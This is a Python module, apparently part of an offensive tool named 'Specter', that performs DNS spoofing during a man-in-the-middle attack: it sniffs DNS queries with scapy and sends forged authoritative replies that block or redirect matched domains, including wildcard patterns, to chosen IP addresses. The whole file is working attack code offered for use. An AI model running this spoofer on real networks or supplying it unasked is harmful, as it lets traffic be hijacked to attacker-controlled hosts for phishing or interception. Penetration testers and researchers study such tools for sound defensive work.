"""
DNS Spoofing module for Specter.

Intercepts DNS queries during a MITM attack and returns forged responses
based on a configurable redirect table. Supports wildcard domains,
block mode (returns 0.0.0.0) and redirect mode (returns custom IP).
"""

import fnmatch
import logging
import threading
from typing import Dict, Optional

from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    IP,
    UDP,
    Ether,
    send,
    sendp,
    sniff,
    conf,
)

logger = logging.getLogger(__name__)


class DNSSpoofer:
    """
    DNS spoofing engine that runs in a background thread.

    Modes:
        - "block": Returns 0.0.0.0 (IPv4) for matched domains (sinkhole).
        - "redirect": Returns a specified IP for matched domains.

    Args:
        interface: Network interface to sniff on.
        redirect_table: Mapping of domain patterns to fake IPs.
                        Supports wildcards (e.g., "*.google.com").
                        Use None or "0.0.0.0" as value for block mode entries.
        mode: Default mode ("block" or "redirect"). Per-entry IPs override this.
        default_redirect_ip: IP to use in redirect mode when a table entry has no
                             explicit IP (value is True or empty string).
        ttl: TTL for forged DNS responses.
    """

    BLOCK_IP = "0.0.0.0"

    def __init__(
        self,
        interface: Optional[str] = None,
        redirect_table: Optional[Dict[str, Optional[str]]] = None,
        mode: str = "block",
        default_redirect_ip: str = "127.0.0.1",
        ttl: int = 600,
    ):
        self.interface = interface or conf.iface
        self.redirect_table: Dict[str, Optional[str]] = redirect_table or {}
        self.mode = mode
        self.default_redirect_ip = default_redirect_ip
        self.ttl = ttl

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._lock = threading.Lock()

        # Stats
        self.spoofed_count = 0
        self.queries_seen = 0

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def start(self) -> None:
        """Start the DNS spoofer in a background thread."""
        if self._running:
            logger.warning("DNSSpoofer is already running.")
            return

        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(
            target=self._sniff_loop, name="DNSSpoofer", daemon=True
        )
        self._thread.start()
        logger.info(
            "DNSSpoofer started on interface %s (mode=%s, entries=%d)",
            self.interface,
            self.mode,
            len(self.redirect_table),
        )

    def stop(self) -> None:
        """Stop the DNS spoofer and wait for the thread to exit."""
        if not self._running:
            return

        self._stop_event.set()
        self._running = False

        if self._thread is not None:
            self._thread.join(timeout=5)
            self._thread = None

        logger.info(
            "DNSSpoofer stopped. Spoofed %d / %d queries.",
            self.spoofed_count,
            self.queries_seen,
        )

    def add_entry(self, domain: str, ip: Optional[str] = None) -> None:
        """Add or update a redirect table entry at runtime."""
        with self._lock:
            self.redirect_table[domain.lower().rstrip(".")] = ip
        logger.debug("Added DNS spoof entry: %s -> %s", domain, ip or self.BLOCK_IP)

    def remove_entry(self, domain: str) -> None:
        """Remove a redirect table entry at runtime."""
        with self._lock:
            self.redirect_table.pop(domain.lower().rstrip("."), None)

    # ------------------------------------------------------------------
    # Internal
    # ------------------------------------------------------------------

    def _sniff_loop(self) -> None:
        """Main sniffing loop running in the background thread."""
        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self._handle_packet,
            store=False,
            stop_filter=lambda _: self._stop_event.is_set(),
        )

    def _handle_packet(self, pkt) -> None:
        """Process a captured packet looking for DNS queries to spoof."""
        if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
            return

        dns_layer = pkt[DNS]

        # Only process queries (QR=0)
        if dns_layer.qr != 0:
            return

        qname = dns_layer.qd.qname.decode("utf-8", errors="ignore").rstrip(".")
        self.queries_seen += 1

        spoofed_ip = self._resolve_entry(qname)
        if spoofed_ip is None:
            return

        # Build and send the forged response
        self._send_spoofed_response(pkt, qname, spoofed_ip)
        self.spoofed_count += 1
        logger.info("Spoofed DNS: %s -> %s", qname, spoofed_ip)

    def _resolve_entry(self, qname: str) -> Optional[str]:
        """
        Check if qname matches any entry in the redirect table.
        Returns the IP to spoof, or None if no match.
        """
        qname_lower = qname.lower()

        with self._lock:
            # Exact match first
            if qname_lower in self.redirect_table:
                return self._ip_for_entry(self.redirect_table[qname_lower])

            # Wildcard match
            for pattern, ip in self.redirect_table.items():
                if fnmatch.fnmatch(qname_lower, pattern):
                    return self._ip_for_entry(ip)

        return None

    def _ip_for_entry(self, entry_ip: Optional[str]) -> str:
        """Determine the IP to return based on mode and entry value."""
        if self.mode == "block":
            # In block mode, always return 0.0.0.0 unless entry has explicit IP
            if entry_ip and entry_ip != self.BLOCK_IP:
                return entry_ip
            return self.BLOCK_IP

        # Redirect mode
        if entry_ip and entry_ip != self.BLOCK_IP:
            return entry_ip
        return self.default_redirect_ip

    def _send_spoofed_response(self, pkt, qname: str, spoofed_ip: str) -> None:
        """Craft and send a forged DNS response packet."""
        qname_bytes = (qname + ".").encode()

        # Build IP layer
        ip_layer = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src,
        )

        udp_layer = UDP(
            sport=pkt[UDP].dport,
            dport=pkt[UDP].sport,
        )

        dns_layer = DNS(
            id=pkt[DNS].id,
            qr=1,  # Response
            aa=1,  # Authoritative
            qd=pkt[DNS].qd,
            an=DNSRR(
                rrname=qname_bytes,
                type="A",
                ttl=self.ttl,
                rdata=spoofed_ip,
            ),
        )

        forged = ip_layer / udp_layer / dns_layer

        send(forged, verbose=False, iface=self.interface)
